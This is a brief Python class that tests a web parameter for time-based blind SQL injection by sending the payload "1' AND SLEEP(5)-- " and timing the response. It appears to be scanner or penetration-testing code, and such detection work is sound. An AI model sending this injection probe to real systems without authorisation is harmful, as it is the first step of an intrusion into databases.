import requests
import time

class TimeBasedDetection:
    def __init__(self, url):
        self.url = url

    def is_vulnerable(self, param):
        # Test payloads
        payload = {param: "1' AND SLEEP(5)-- "}
        
        # Measure the response time
        start_time = time.time()
        response = requests.get(self.url, params=payload)
        elapsed_time = time.time() - start_time

        # Check if the response time is significantly longer than usual
        if elapsed_time > 5:
            return True
        return False
